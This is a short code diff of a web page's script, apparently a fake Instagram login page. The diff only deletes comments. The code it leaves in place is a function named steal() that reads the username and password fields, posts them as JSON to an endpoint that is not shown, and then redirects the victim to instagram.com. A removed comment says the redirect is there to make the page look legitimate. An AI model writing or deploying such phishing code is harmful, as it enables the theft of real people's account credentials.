@@ -6,7 +6,7 @@
 
 <script>
   function steal(e) {
-    e.preventDefault(); // Prevent form submission
+    e.preventDefault(); 
 
     const u = document.getElementById("username").value;
     const p = document.getElementById("password").value;
@@ -16,7 +16,7 @@
       body: JSON.stringify({ username: u, password: p }),
       headers: { "Content-Type": "application/json" }
     }).then(() => {
-      // Optional: Redirect to Instagram to make it look legit
+     
       window.location.href = "https://instagram.com";
     });
   }
